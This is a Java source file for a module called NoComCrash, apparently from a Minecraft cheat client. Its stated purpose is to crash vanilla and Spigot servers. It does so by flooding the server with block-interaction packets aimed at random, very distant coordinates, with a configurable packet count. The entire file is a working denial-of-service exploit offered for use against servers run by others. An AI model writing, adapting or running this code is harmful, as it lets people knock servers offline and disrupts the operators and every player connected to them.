package me.dustin.crash.feature;

import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.option.annotate.Op;
import me.dustin.jex.helper.misc.ChatHelper;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

@Feature.Manifest(category = Feature.Category.MISC, description = "Crashes vanilla and Spigot servers")
public class NoComCrash extends Feature {

    @Op(name = "Packet Count", min = 1, max = 100, inc = 10)
    public int packetCount = 15;
    @Op(name = "Auto Disable")
    public boolean autoDisable = true;

    private final Random r = new Random();

    public NoComCrash() {
        setFeatureCategory(Category.valueOf("CRASH"));
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        try {
            Vec3d current_pos = Wrapper.INSTANCE.getLocalPlayer().getPos();
            for (int i = 0; i < packetCount; i++) {
                Vec3d cpos = pickRandomPos();
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, new BlockPos(cpos), false));
                NetworkHelper.INSTANCE.sendPacket(packet);
            }
        } catch (Exception ignored) {
            ChatHelper.INSTANCE.addClientMessage("Stopping movement crash because an error occurred!");
            setState(false);
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.POST));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisable)
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private Vec3d pickRandomPos() {
        return new Vec3d(r.nextInt(0xFFFFFF), 255, r.nextInt(0xFFFFFF));
    }
}
